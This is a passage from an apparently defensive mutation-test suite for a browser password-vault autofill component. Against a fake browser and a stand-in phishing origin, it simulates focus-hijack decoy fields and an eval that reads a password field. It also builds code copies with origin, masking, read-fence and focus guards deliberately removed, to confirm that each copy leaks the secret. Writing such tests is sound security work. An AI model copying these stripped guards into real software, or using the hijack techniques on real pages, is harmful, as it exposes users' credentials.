    // 5. N5 (Ruling A accidental focus-steal guard): Post-prepare DOM & macrotask steals (`mo-inert`, `focus`, `click`, `strip-inert`, `select`, `move`, `replace`) with `preInsertDelayMs: 25`
    fkStd.mode.preInsertDelayMs = 25;
    const attackModes = [
      ['mo-inert', [{ id: 'decoy', tag: 'input', type: 'text', name: 'Decoy', moStripInert: true }, { id: 'trap', tag: 'input', type: 'password', name: 'Trap' }]],
      ['focus', [{ id: 'decoy', tag: 'input', type: 'text', name: 'Decoy' }, { id: 'trap', tag: 'input', type: 'password', name: 'Trap', focusHijackId: 'decoy', focusHijackMode: 'post-prepare' }]],
      ['click', [{ id: 'decoy', tag: 'input', type: 'text', name: 'Decoy' }, { id: 'trap', tag: 'input', type: 'password', name: 'Trap', focusHijackId: 'decoy', focusHijackMode: 'post-prepare', postPrepareAttack: 'click' }]],
      ['strip-inert', [{ id: 'decoy', tag: 'input', type: 'text', name: 'Decoy' }, { id: 'trap', tag: 'input', type: 'password', name: 'Trap', focusHijackId: 'decoy', focusHijackMode: 'post-prepare', postPrepareAttack: 'strip-inert' }]],
      ['select', [{ id: 'decoy', tag: 'input', type: 'text', name: 'Decoy' }, { id: 'trap', tag: 'input', type: 'password', name: 'Trap', focusHijackId: 'decoy', focusHijackMode: 'post-prepare', postPrepareAttack: 'select' }]],
      ['move', [{ id: 'decoy', tag: 'input', type: 'text', name: 'Decoy' }, { id: 'trap', tag: 'input', type: 'password', name: 'Trap', focusHijackId: 'decoy', focusHijackMode: 'post-prepare', postPrepareAttack: 'move' }]],
      ['replace', [{ id: 'decoy', tag: 'input', type: 'text', name: 'Decoy' }, { id: 'trap', tag: 'input', type: 'password', name: 'Trap', focusHijackId: 'decoy', focusHijackMode: 'post-prepare', postPrepareAttack: 'replace' }]],
    ];
    const n5Failures = [];
    for (const [atkName, els] of attackModes) {
      fkStd.setDom(tidB, { url: 'https://shop.example.test/login', elements: els });
      const rAtk = await wB.fillVaultField({ profileId: 'bp-r24', browserKey: 'bk-r24' }, {
        target: '#trap', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-r24'] },
      });
      const valsAtk = fkStd.readDomValues(tidB);
      const countsAtk = fkStd.readDomInputCounts(tidB);
      const leaked = Object.entries(valsAtk).some(([k, v]) => k !== 'trap' && String(v || '').length > 0)
        || Object.entries(countsAtk).some(([k, c]) => k !== 'trap' && c.inputEvents > 0);
      // Either `inert` prevented focus from ever leaving `#trap` (`ok: true`, `#trap` holds `PW_N1`, 0 non-target chars/events),
      // OR the capture/MO guard tripped (`ok: false`, `login_form_changed`, `#trap` wiped empty, 0 non-target chars/events).
      const neutralized = Boolean(rAtk.ok && valsAtk.trap === PW_N1 && (atkName === 'focus' || atkName === 'click'));
      const guarded = Boolean(!rAtk.ok && rAtk.code === 'login_form_changed' && String(valsAtk.trap || '') === '');
      if (leaked || (!neutralized && !guarded)) {
        n5Failures.push({ atkName, rAtk, valsAtk, countsAtk });
      }
    }
    fkStd.mode.preInsertDelayMs = 0;
    ok(n5Failures.length === 0,
      'N5: all 7 post-prepare paths (mo-inert, focus, click, strip-inert, select, move, replace) land 0 chars & 0 insertText events outside target',
      n5Failures);

    wB.shutdown();
  } finally {
    LF?.clearAllFilledSecrets?.();
    engB.close();
    await fkStd.close();
    fs.rmSync(ROOT4B, { recursive: true, force: true });
  }
}

// ═══ ⑤ EIGHTEEN NAMED RED MUTANTS (ORIGIN · FENCE · MASK+WIPE · L1..L5 · M1 · N1×2 · N2 · N4 · m2 · N5 · m3 · m6 · m7) ═══
console.log('⑤ 18 named RED mutants: origin-gate · read-fence · mask-wipe · L1..L5 · M1 · N1(hold+toPerson) · N2(AX) · N4(cap) · m2(net) · N5(guard) · m3(verb) · m6(totp) · m7(ambig)');
if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js exports fillVaultElement')) {
  const MUT = mutantCopies('vl-r23-mutants', REPO);
  const blSrc = fs.readFileSync(path.join(REPO, 'src/browser-login.js'), 'utf8');
  const lfSrc = fs.readFileSync(path.join(REPO, 'src/server/browser-login-fill.js'), 'utf8');
  const bdSrc = fs.readFileSync(path.join(REPO, 'src/server/browser-dialogs.js'), 'utf8');
  const veSrc = fs.readFileSync(path.join(REPO, 'src/server/vault-engine.js'), 'utf8');

  // Mutant 1: remove origin gate in fillVaultElement -> types secret on evil origin!
  const m1LfSrc = lfSrc.replace('  if (iso.origin !== wantOrigin) {', '  if (false && iso.origin !== wantOrigin) {');
  const LF_M1 = m1LfSrc !== lfSrc ? MUT.load('src/server/browser-login-fill.js', m1LfSrc, 'origin-gate-removed') : null;
  const fkM1 = await startFakeKernel({ firstUrl: 'https://evil.example.test/phish' });
  try {
    const tidM1 = fkM1.targets()[0].targetId;
    fkM1.setDom(tidM1, { url: 'https://evil.example.test/phish', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
    const WebSocket = require(path.join(REPO, 'node_modules/ws'));
    const wsM1 = new WebSocket(fkM1.wsUrl);
    await new Promise((r) => wsM1.once('open', r));
    let idSeq = 0, sidM1 = null;
    const pending = new Map();
    wsM1.on('message', (raw) => {
      const m = JSON.parse(String(raw));
      if (m.method === 'Target.attachedToTarget') sidM1 = m.params.sessionId;
      if (m.id && pending.has(m.id)) { const fn = pending.get(m.id); pending.delete(m.id); fn(m); }
    });
    const sendCdp = (method, params = {}, sessionId = undefined) => new Promise((resolve) => {
      const id = ++idSeq;
      pending.set(id, resolve);
      wsM1.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));
    });
    await sendCdp('Target.setAutoAttach', { autoAttach: true, waitForDebuggerOnStart: false, flatten: true });
    for (let i = 0; i < 30 && !sidM1; i++) await new Promise((r) => setTimeout(r, 5));

    const realPhish = await LF.fillVaultElement({
      call: (m, p) => sendCdp(m, p, sidM1), browserCall: (m, p) => sendCdp(m, p),
      targetId: tidM1, trackedUrl: 'https://evil.example.test/phish',
      origin: 'https://shop.example.test', target: '#pw', slot: 'current', value: 'Secret#OriginGate1', secret: true,
    });
    const mutPhish = LF_M1 ? await LF_M1.fillVaultElement({
      call: (m, p) => sendCdp(m, p, sidM1), browserCall: (m, p) => sendCdp(m, p),
      targetId: tidM1, trackedUrl: 'https://evil.example.test/phish',
      origin: 'https://shop.example.test', target: '#pw', slot: 'current', value: 'Secret#OriginGate1', secret: true,
    }) : null;
    ok(!realPhish.ok && realPhish.code === 'login_phishing' && Boolean(mutPhish && mutPhish.ok) && fkM1.readDomValues(tidM1).pw === 'Secret#OriginGate1',
      'MUTANT 1 RED (origin-gate-removed): real fillVaultElement refuses https://evil.example.test [login_phishing]; mutant types secret into evil origin');
    wsM1.close();
  } finally {
    LF.clearAllFilledSecrets?.();
    LF_M1?.clearAllFilledSecrets?.();
    await fkM1.close();
  }

  // Mutant 2: remove read fence (`liveFillVerdict` -> `{ ok: true }`) -> lets `eval` read live DOM!
  const m2BlSrc = blSrc.replace(
    "function liveFillVerdict({ verb = '', argv = [], batchVerbs = null, origin = '', holdReason = '' } = {}) {",
    "function liveFillVerdict() { return { ok: true }; }\nfunction _deadLiveFillVerdict({ verb = '', argv = [], batchVerbs = null, origin = '', holdReason = '' } = {}) {",
  );
  const BL_M2 = m2BlSrc !== blSrc ? MUT.load('src/browser-login.js', m2BlSrc, 'read-fence-removed') : null;
  const realFence = BL.liveFillVerdict({ verb: 'eval', argv: ['eval', 'document.querySelector("#pw").value'], origin: 'https://shop.example.test' });
  const mutFence = BL_M2 ? BL_M2.liveFillVerdict({ verb: 'eval', argv: ['eval', 'document.querySelector("#pw").value'], origin: 'https://shop.example.test' }) : null;
  ok(!realFence.ok && realFence.code === 'login_fill_live' && Boolean(mutFence && mutFence.ok === true),
    'MUTANT 2 RED (read-fence-removed): real liveFillVerdict blocks `eval` [login_fill_live]; mutant admits `eval` while secret is live');

  // Mutant 3: remove `<input type="password">` mask check & post-submit wipe -> types password into `<input type="text">` and leaves plaintext after submit!
  const m3LfSrc = lfSrc
    .replaceAll("const wantSecretPw = Boolean(secret && slot !== 'otp');", 'const wantSecretPw = false;')
    .replace('async function wipeTabTypedInputs(', 'async function wipeTabTypedInputs() { return { ok: true, wiped: 0 }; }\nasync function _deadWipeTabTypedInputs(');
  const LF_M3 = m3LfSrc !== lfSrc ? MUT.load('src/server/browser-login-fill.js', m3LfSrc, 'mask-wipe-removed') : null;
  const fkM3 = await startFakeKernel({ firstUrl: 'https://shop.example.test/login' });
  try {
    const tidM3 = fkM3.targets()[0].targetId;
    fkM3.setDom(tidM3, { url: 'https://shop.example.test/login', elements: [{ id: 'txt', tag: 'input', type: 'text', name: 'Plain' }] });
    const WebSocket = require(path.join(REPO, 'node_modules/ws'));
    const wsM3 = new WebSocket(fkM3.wsUrl);
    await new Promise((r) => wsM3.once('open', r));
    let idSeq = 0, sidM3 = null;
    const pending = new Map();
    wsM3.on('message', (raw) => {
      const m = JSON.parse(String(raw));
      if (m.method === 'Target.attachedToTarget') sidM3 = m.params.sessionId;
      if (m.id && pending.has(m.id)) { const fn = pending.get(m.id); pending.delete(m.id); fn(m); }
    });
    const sendCdp = (method, params = {}, sessionId = undefined) => new Promise((resolve) => {
      const id = ++idSeq;
      pending.set(id, resolve);
      wsM3.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));
    });
    await sendCdp('Target.setAutoAttach', { autoAttach: true, waitForDebuggerOnStart: false, flatten: true });
    for (let i = 0; i < 30 && !sidM3; i++) await new Promise((r) => setTimeout(r, 5));

    const realUnmasked = await LF.fillVaultElement({
      call: (m, p) => sendCdp(m, p, sidM3), browserCall: (m, p) => sendCdp(m, p),
      targetId: tidM3, trackedUrl: 'https://shop.example.test/login', profileId: 'bp-m3',
      origin: 'https://shop.example.test', target: '#txt', slot: 'current', value: 'Secret#MaskWipe3', secret: true,
    });
    const mutUnmasked = LF_M3 ? await LF_M3.fillVaultElement({
      call: (m, p) => sendCdp(m, p, sidM3), browserCall: (m, p) => sendCdp(m, p),
      targetId: tidM3, trackedUrl: 'https://shop.example.test/login', profileId: 'bp-m3',
      origin: 'https://shop.example.test', target: '#txt', slot: 'current', value: 'Secret#MaskWipe3', secret: true,
    }) : null;
    if (LF_M3) await LF_M3.wipeTabTypedInputs({ call: (m, p) => sendCdp(m, p, sidM3), browserCall: (m, p) => sendCdp(m, p), targetId: tidM3, profileId: 'bp-m3' });
    const afterMutWipe = fkM3.readDomValues(tidM3).txt;
    await LF.wipeTabTypedInputs({ call: (m, p) => sendCdp(m, p, sidM3), browserCall: (m, p) => sendCdp(m, p), targetId: tidM3, profileId: 'bp-m3' });
    ok(!realUnmasked.ok && realUnmasked.code === 'login_bad_field' && Boolean(mutUnmasked && mutUnmasked.ok) && afterMutWipe === 'Secret#MaskWipe3',
      'MUTANT 3 RED (mask-wipe-removed): real fillVaultElement refuses <input type="text"> [login_bad_field] and wipes after submit; mutant types into text input and leaves plaintext');
    wsM3.close();
  } finally {
    LF.clearAllFilledSecrets?.();
    LF_M3?.clearAllFilledSecrets?.();
    await fkM3.close();
  }

  // Mutant 4 (L1): remove `multipart/` branch & fail-closed default -> cross-origin FormData body leaks secret unblocked!
  const m4BdSrc = bdSrc
    .replace("if (media.startsWith('multipart/') || (!media && /^--[^\\r\\n]{1,128}\\r?\\ncontent-disposition:/i.test(bodyText))) {", 'if (false) {')
    .replace("return { carries: false, undecodable: true, reason: `unsupported_content_type:${media || 'unknown'}` };", "return { carries: false, undecodable: false, reason: 'none' };");
  const BD_M4 = m4BdSrc !== bdSrc ? MUT.load('src/server/browser-dialogs.js', m4BdSrc, 'multipart-branch-removed') : null;
  {
    const m4Secret = 'Mut4Secret!' + crypto.randomBytes(4).toString('hex');
    const m4Sigs = Dm.credSigOf ? [Dm.credSigOf(m4Secret)] : [];
    const bnd = '----WebKitFormBoundaryMut4';
    const ct = `multipart/form-data; boundary=${bnd}`;
    const mp = `--${bnd}\r\nContent-Disposition: form-data; name="pw"\r\n\r\n${m4Secret}\r\n--${bnd}--\r\n`;
    const realDetects = Dm.bodyCarriesCredential ? Dm.bodyCarriesCredential(mp, m4Sigs, ct) : false;
    const mutDetects = BD_M4?.bodyCarriesCredential ? BD_M4.bodyCarriesCredential(mp, m4Sigs, ct) : true;
    ok(realDetects === true && mutDetects === false,
      'MUTANT 4 RED (L1 multipart-branch-removed): real bodyCarriesCredential detects secret in multipart/form-data; mutant misses it and lets cross-origin FormData pass');
  }

  // Mutant 5 (L2): remove `rev` from `vault-engine.js:secretNames()` -> Vault-window `{ name, rev: entry.rev }` fails with `card_changed` on `rev >= 2`!
  const m5VeSrc = veSrc.replace(', ...(Number.isInteger(b.rev) && b.rev >= 1 ? { rev: b.rev } : {})', '');
  const VE_M5 = m5VeSrc !== veSrc ? MUT.load('src/server/vault-engine.js', m5VeSrc, 'secretNames-without-rev') : null;
  {
    const dirM5 = scratch('vl-r23-m5');
    fs.rmSync(dirM5, { recursive: true, force: true });
    fs.mkdirSync(dirM5, { recursive: true });
    try {
      const g5 = GS.create({ memory: true });
      const engM5 = VE_M5 ? VE_M5.create({ dataDir: dirM5, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false }) : null;
      if (engM5) {
        await engM5.setup('Mut5Vault#Pass');
        const logM5 = Lm.create({ vault: engM5, grants: () => g5, log: () => {} });
        logM5.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: 'InitPw!1234567890' }, { who: 'owner' });
        logM5.grant('web-login:https://shop.example.test#alice', 'any-account', 'session:conv-m5');
        const rfM5 = logM5.resolveFill({ tabOrigin: 'https://shop.example.test', spec: 'shop.example.test#alice/password', generate: true, facts: { conversationKeys: ['conv-m5'] } });
        const rowM5 = logM5.list().entries.find((e) => e.user === 'alice');
        const mutConf = logM5.confirmOwn(rowM5.name, { rev: rowM5.rev, who: 'owner' });
        const mutDisc = logM5.discardPending(rowM5.name, { rev: rowM5.rev, who: 'owner' });
        ok(rowM5.rev === 1 && !mutConf.ok && mutConf.code === 'card_changed' && !mutDisc.ok && mutDisc.code === 'card_changed',
          'MUTANT 5 RED (L2 secretNames-without-rev): without rev in secretNames(), list() reports rev=1 and Vault-window confirm/discard fail with card_changed',
          { rfM5, rev: rowM5?.rev, mutConf, mutDisc });
        engM5.close();
      } else {
        ok(false, 'MUTANT 5 RED (L2 secretNames-without-rev): anchor not found in vault-engine.js');
      }
    } finally {
      fs.rmSync(dirM5, { recursive: true, force: true });
    }
  }

  // Mutant 6 (L3): pass `{ usernameHint: p.usernameHint }` instead of `{ username: uname }` -> takeover credentialSubmitted files 0 cards!
  const m6BdSrc = bdSrc.replace(
    'const r = logins.offerOwnerSaveCard({ origin: pageOrigin, username: uname, password: rawPw, profileId: w.profileId });',
    'const r = logins.offerOwnerSaveCard({ origin: pageOrigin, usernameHint: uname, password: rawPw, profileId: w.profileId });',
  );
  const BD_M6 = m6BdSrc !== bdSrc ? MUT.load('src/server/browser-dialogs.js', m6BdSrc, 'usernameHint-field-mismatch') : null;
  // Mutant 7 (L4): restore cross-tab `preferRef` fallback in `pickScopedTabFor` -> `@e2` on tab B types into background tab A!
  const m7BdSrc = bdSrc
    .replace('function pickScopedTabFor(w, target, { targetId = null } = {}) {', 'function pickScopedTabFor(w, target, { targetId = null, preferRef = null } = {}) {')
    .replace(
      'if (actE && inScope(scope, actE.targetId) && actE.sid) return actE;',
      'if (actE && inScope(scope, actE.targetId) && actE.sid && (!preferRef || actE.snapshotRefs?.specs?.has(preferRef))) return actE;\n    if (preferRef) { const withRef = [...w.targets.values()].find((x) => x.sid && x.snapshotRefs?.specs?.has(preferRef)); if (withRef) return withRef; }',
    )
    .replace(
      'const isRef = /^@[A-Za-z0-9_-]+$/.test(tgtStr);\n    const e = pickScopedTabFor(w, target, { targetId });',
      'const isRef = /^@[A-Za-z0-9_-]+$/.test(tgtStr);\n    const e = pickScopedTabFor(w, target, { targetId, preferRef: isRef ? tgtStr : null });',
    );
  const BD_M7 = m7BdSrc !== bdSrc ? MUT.load('src/server/browser-dialogs.js', m7BdSrc, 'cross-tab-ref-fallback') : null;
  // Mutant 9 (M1): skip `precheckVaultFill` -> locked vault sends CDP calls and returns `login_phishing` on wrong-origin tab!
  const m9BdSrc = bdSrc.replace('if (!prechecked) {', 'if (false && !prechecked) {');
  const BD_M9 = m9BdSrc !== bdSrc ? MUT.load('src/server/browser-dialogs.js', m9BdSrc, 'phishing-before-vault-locked') : null;

  {
    const dirM679 = scratch('vl-r23-m679');
    fs.rmSync(dirM679, { recursive: true, force: true });
    fs.mkdirSync(dirM679, { recursive: true });
    const fkM = await startFakeKernel({ firstUrl: 'https://shop.example.test/login' });
    const engM = VE.create({ dataDir: dirM679, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
    await engM.setup('Mut679#Vault');
    try {
      const gM = GS.create({ memory: true });
      const cardsM6 = [];
      const logM = Lm.create({
        vault: engM, grants: () => gM, log: () => {},
        forYou: { add: (_pid, it) => { if (it.action?.type === 'save-login') cardsM6.push(it); return 'ut-m6'; }, resolve() {} },
      });
      logM.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: 'AliceMut!12345678' }, { who: 'owner' });
      logM.grant('web-login:https://shop.example.test#alice', 'any-account', 'session:conv-m7');
      const sk = {
        cdpEndpointFor: async () => ({ ok: true, url: fkM.wsUrl }),
        onLease: () => () => {},
        saveLoginFenceState() {},
        loginFenceStateOf: () => null,
        loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => stubLoginChannel({ ephemeral, remoteSession, hasCdp: Boolean(fkM.wsUrl), action }),
      };
      // Run M6 (L3)
      const w6 = BD_M6 ? BD_M6.create({ keeper: sk, log: quiet, enableTimeoutMs: 400, holdersOf: () => [{ browserKey: 'bk-m', sessionId: 's-m' }], leaseCountOf: () => 1, logins: logM, takeoverOf: () => true }) : null;
      if (w6) {
        await w6.arm('bp-m6');
        fkM.submitCredentialForm({ targetId: fkM.targets()[0].targetId, origin: 'https://shop.example.test', usernameHint: 'human_m6', password: 'HumanM6!Password1' });
        await new Promise((r) => setTimeout(r, 30));
        ok(cardsM6.length === 0, 'MUTANT 6 RED (L3 usernameHint-field-mismatch): passing usernameHint instead of username files 0 save-login cards');
        w6.shutdown();
      } else ok(false, 'MUTANT 6 RED (L3): anchor not found');

      // Run M7 (L4)
      const tidA = fkM.targets()[0].targetId;
      const tidB2 = fkM.addTarget('https://shop.example.test/b');
      fkM.setDom(tidA, { url: 'https://shop.example.test/login', elements: [{ id: 'u', tag: 'input', type: 'email', name: 'Email' }, { id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
      fkM.setDom(tidB2, { url: 'https://shop.example.test/b', elements: [{ id: 'q', tag: 'input', type: 'text', name: 'Search' }] });
      const w7 = BD_M7 ? BD_M7.create({ keeper: sk, log: quiet, enableTimeoutMs: 400, holdersOf: () => [{ browserKey: 'bk-m', sessionId: 's-m' }], leaseCountOf: () => 1, logins: logM }) : null;
      if (w7) {
        await w7.arm('bp-m7');
        for (let i = 0; i < 20; i++) {
          w7.noteActiveTab({ profileId: 'bp-m7', browserKey: 'bk-m' }, tidA);
          const nsA = await w7.noteSnapshot({ profileId: 'bp-m7', browserKey: 'bk-m' }, '- textbox "Email" [ref=e1]\n- textbox "Password" [ref=e2]');
          if (nsA && nsA.ok && nsA.count === 2) break;
          await new Promise((r) => setTimeout(r, 10));
        }
        for (let i = 0; i < 20; i++) {
          w7.noteActiveTab({ profileId: 'bp-m7', browserKey: 'bk-m' }, tidB2);
          const nsB = await w7.noteSnapshot({ profileId: 'bp-m7', browserKey: 'bk-m' }, '- textbox "Search" [ref=e1]');
          if (nsB && nsB.ok && nsB.count === 1) break;
          await new Promise((r) => setTimeout(r, 10));
        }
        const r7 = await w7.fillVaultField({ profileId: 'bp-m7', browserKey: 'bk-m' }, { target: '@e2', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-m7'] } });
        ok(Boolean(r7 && r7.ok) && fkM.readDomValues(tidA).pw === 'AliceMut!12345678',
          'MUTANT 7 RED (L4 cross-tab-ref-fallback): falling back to background tab snapshotRefs types secret into background tab A',
          { r7, domA: fkM.readDomValues(tidA) });
        w7.shutdown();
      } else ok(false, 'MUTANT 7 RED (L4): anchor not found');

      // Run M9 (M1)
      fkM.setDom(tidA, { url: 'https://evil.example.test/phish', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
      const w9 = BD_M9 ? BD_M9.create({ keeper: sk, log: quiet, enableTimeoutMs: 400, holdersOf: () => [{ browserKey: 'bk-m', sessionId: 's-m' }], leaseCountOf: () => 1, logins: logM }) : null;
      if (w9) {
        await w9.arm('bp-m9');
        w9.noteActiveTab({ profileId: 'bp-m9', browserKey: 'bk-m' }, tidA);
        engM.lock();
        const m0 = fkM.mark();
        const r9 = await w9.fillVaultField({ profileId: 'bp-m9', browserKey: 'bk-m' }, { target: '#pw', spec: 'shop.example.test#alice/password', facts: {} });
        const c9 = fkM.calls().filter((c) => c.seq > m0);
        ok(c9.length >= 3, 'MUTANT 9 RED (M1 phishing-before-vault-locked): without precheckVaultFill, locked vault sends CDP calls to browser before refusing', { code: r9?.code, cdp: c9.length });
        w9.shutdown();
      } else ok(false, 'MUTANT 9 RED (M1): anchor not found');
    } finally {
      LF.clearAllFilledSecrets?.();
      engM.close();
      await fkM.close();
      fs.rmSync(dirM679, { recursive: true, force: true });
    }
  }

  // Mutant 8 (L5): re-introduce async gap between focus-check and `Input.insertText` -> `setTimeout(0)` decoy receives plaintext secret!
  const m8LfSrc = lfSrc
    .replace("if (typeof setTimeout === 'function') {", "if (false && typeof setTimeout === 'function') {")
    .replaceAll('try { node.inert = true; } catch {}', '/* inert disabled */')
    .replace("window.addEventListener('focusin', onTypingFocusGuard, true);", '/* focusin guard disabled */')
    .replace("window.addEventListener('focus', onTypingFocusGuard, true);", '/* focus guard disabled */')
    .replace("const ins = await send('Input.insertText', { text: val });", "await new Promise((r) => setTimeout(r, 15)); const ins = await send('Input.insertText', { text: val });");
  const LF_M8 = m8LfSrc !== lfSrc ? MUT.load('src/server/browser-login-fill.js', m8LfSrc, 'async-focus-seam') : null;
  {
    const fkM8 = await startFakeKernel({ firstUrl: 'https://shop.example.test/login' });
    try {
      const tidM8 = fkM8.targets()[0].targetId;
      fkM8.setDom(tidM8, {
        url: 'https://shop.example.test/login',
        elements: [
          { id: 'decoy_txt', tag: 'input', type: 'text', name: 'Decoy' },
          { id: 'trap_t', tag: 'input', type: 'password', name: 'Trap', focusHijackId: 'decoy_txt', focusHijackMode: 'timeout' },
        ],
      });
      const WebSocket = require(path.join(REPO, 'node_modules/ws'));
      const wsM8 = new WebSocket(fkM8.wsUrl);
      await new Promise((r) => wsM8.once('open', r));
      let idSeq = 0, sidM8 = null;
      const pending = new Map();
      wsM8.on('message', (raw) => {
        const m = JSON.parse(String(raw));
        if (m.method === 'Target.attachedToTarget') sidM8 = m.params.sessionId;
        if (m.id && pending.has(m.id)) { const fn = pending.get(m.id); pending.delete(m.id); fn(m); }
      });
      const sendCdp = (method, params = {}, sessionId = undefined) => new Promise((resolve) => {
        const id = ++idSeq;
        pending.set(id, resolve);
        wsM8.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));
      });
      await sendCdp('Target.setAutoAttach', { autoAttach: true, waitForDebuggerOnStart: false, flatten: true });
      for (let i = 0; i < 30 && !sidM8; i++) await new Promise((r) => setTimeout(r, 5));

      const realL5 = await LF.fillVaultElement({
        call: (m, p) => sendCdp(m, p, sidM8), browserCall: (m, p) => sendCdp(m, p),
        targetId: tidM8, trackedUrl: 'https://shop.example.test/login',
        origin: 'https://shop.example.test', target: '#trap_t', slot: 'current', value: 'Secret#AsyncSeam8', secret: true,
      });
      const realEvents = fkM8.readDomInputCounts(tidM8).decoy_txt.inputEvents;
      const mutL5 = LF_M8 ? await LF_M8.fillVaultElement({
        call: (m, p) => sendCdp(m, p, sidM8), browserCall: (m, p) => sendCdp(m, p),
        targetId: tidM8, trackedUrl: 'https://shop.example.test/login',
        origin: 'https://shop.example.test', target: '#trap_t', slot: 'current', value: 'Secret#AsyncSeam8', secret: true,
      }) : null;
      const mutEvents = fkM8.readDomInputCounts(tidM8).decoy_txt.inputEvents;
      ok(!realL5.ok && realL5.code === 'login_form_changed' && realEvents === 0 && mutEvents >= 1,
        'MUTANT 8 RED (L5 async-focus-seam): real fillVaultElement types 0 chars into setTimeout(0) <input type="text"> decoy; mutant leaks secret into decoy across async seam',
        { realL5, mutL5, realEvents, mutEvents });
      wsM8.close();
    } finally {
      LF.clearAllFilledSecrets?.();
      LF_M8?.clearAllFilledSecrets?.();
      await fkM8.close();
    }
  }

  // Mutant 10 (N1a): relax `wantCred` on `holdReason` (r23's bug) -> foreign POST passes unwatched after hold!
  const m10BdSrc = bdSrc.replace(
    'const wantCred = Boolean(e.liveFill || e.credPreArming);',
    'const wantCred = Boolean((e.liveFill && !e.liveFill.holdReason) || e.credPreArming);',
  );
  const BD_M10 = m10BdSrc !== bdSrc ? MUT.load('src/server/browser-dialogs.js', m10BdSrc, 'n1-hold-relaxes-fetch') : null;

  // Mutant 11 (N1b): `toPerson` sends raw `Fetch.disable` bypassing `syncTabFetchMode` (leaving `e.fetchMode` stale) -> mode flip drops `*` intercept!
  const m11BdSrc = bdSrc
    .replace('if (e.enabled) { await syncTabFetchMode(w, e);', "if (e.enabled) { await call(w, 'Fetch.disable', {}, e.sid);")
    .replace('  function armPrompts(w, e) {\n    if (!e.sid) return;\n    call(w, \'Page.setInterceptFileChooserDialog\', { enabled: true }, e.sid).then((r) => { if (r && r.error) say(\'fc:\' + r.error.message, `${w.profileId}: the file chooser was not hooked — ${r.error.message}`); });\n    syncTabFetchMode(w, e);',
      '  function armPrompts(w, e) {\n    if (!e.sid) return;\n    call(w, \'Fetch.enable\', { patterns: [{ urlPattern: \'*\', resourceType: \'Document\', requestStage: \'Request\' }], handleAuthRequests: true }, e.sid);');
  const BD_M11 = m11BdSrc !== bdSrc ? MUT.load('src/server/browser-dialogs.js', m11BdSrc, 'n1-toperson-bypasses-sync') : null;

  // Mutant 12 (N2): `noteSnapshot` calls `Accessibility.getFullAXTree` over the watch socket (r23's bug) -> 3,000-row page drops watch with 1009!
  const m12BdSrc = bdSrc.replace(
    '    e.snapshotRefs = { specs, resolved: new Map(), map: null, at: now(), navSeq: e.navSeq || 0 };',
    '    await call(w, \'Accessibility.getFullAXTree\', { frameId: e.targetId }, e.sid);\n    e.snapshotRefs = { specs, resolved: new Map(), map: null, at: now(), navSeq: e.navSeq || 0 };',
  );
  const BD_M12 = m12BdSrc !== bdSrc ? MUT.load('src/server/browser-dialogs.js', m12BdSrc, 'n2-snapshot-full-ax-on-watch') : null;

  // Mutant 13 (N4): `json_too_many_nodes` limit returns `{ carries: false, undecodable: false }` -> cross-origin >4096-node JSON fails open!
  const m13BdSrc = bdSrc.replace(
    "return { carries: false, undecodable: true, reason: 'json_too_many_nodes' };",
    "return { carries: false, undecodable: false, format: 'json' };",
  );
  const BD_M13 = m13BdSrc !== bdSrc ? MUT.load('src/server/browser-dialogs.js', m13BdSrc, 'n4-json-cap-fails-open') : null;

  // Mutant 14 (m2): omit `Network.disable` when `wantCred` drops -> `Network.*` stays enabled after fence lifts!
  const m14BdSrc = bdSrc.replace(
    "ops.push(call(w, 'Network.disable', {}, e.sid, interceptTimeoutMs).catch(() => {}));",
    '/* m2 mutant: Network.disable omitted */',
  );
  const BD_M14 = m14BdSrc !== bdSrc ? MUT.load('src/server/browser-dialogs.js', m14BdSrc, 'm2-network-never-disabled') : null;

  // Mutant 15 (N5): strip post-prepare `inert` + `onTypingFocusGuard` + `onTargetBlurGuard` -> post-prepare macrotask decoy receives `Input.insertText`!
  const m15LfSrc = lfSrc
    .replaceAll('try { node.inert = true; } catch {}', '/* inert off */')
    .replaceAll("try { if (node.setAttribute) node.setAttribute('inert', ''); } catch {}", '/* attr off */')
    .replace("window.addEventListener('focusin', onTypingFocusGuard, true);", '/* focusin off */')
    .replace("window.addEventListener('focus', onTypingFocusGuard, true);", '/* focus off */')
    .replace("el.addEventListener('blur', onTargetBlurGuard, true);", '/* blur off */');
  const LF_M15 = m15LfSrc !== lfSrc ? MUT.load('src/server/browser-login-fill.js', m15LfSrc, 'n5-typing-guard-removed') : null;

  // Mutant 16 (m3): `dialogAnswerFor` omits `else if (started) D.verbStarted` -> `fill --vault` `/audit` decrements parallel verb!
  const rbSrc = fs.readFileSync(path.join(REPO, 'src/routes/browser.js'), 'utf8');
  const m16RbSrc = rbSrc.replace(
    'else if (started) D.verbStarted(',
    'else if (false && started) D.verbStarted(',
  );
  const RB_M16 = m16RbSrc !== rbSrc ? MUT.load('src/routes/browser.js', m16RbSrc, 'm3-unpaired-verb-ended') : null;

  // Mutant 17 (m6): `addOwn` skips checking whether `totp:<totpName>` exists in the vault -> saves dangling `totpName`!
  const lgSrc = fs.readFileSync(path.join(REPO, 'src/server/browser-logins.js'), 'utf8');
  const m17LgSrc = lgSrc.replace(
    "if (!tl.some((s) => s && s.name === `totp:${str(totpName)}`)) {",
    "if (false && !tl.some((s) => s && s.name === `totp:${str(totpName)}`)) {",
  );
  const LG_M17 = m17LgSrc !== lgSrc ? MUT.load('src/server/browser-logins.js', m17LgSrc, 'm6-dangling-totp-allowed') : null;

  // Mutant 18 (m7): `fillVerdict` checks `onSite.length > 1` BEFORE grant check -> discloses usernames to ungranted caller!
  const m18BlSrc = blSrc.replace(
    '      const admitted = [];',
    "      if (onSite.length > 1) return no('login_ambiguous', `${onSite.length} logins match ${spec.origin} (${onSite.map((e) => e.user).slice(0, 5).join(', ')})`);\n      const admitted = [];",
  );
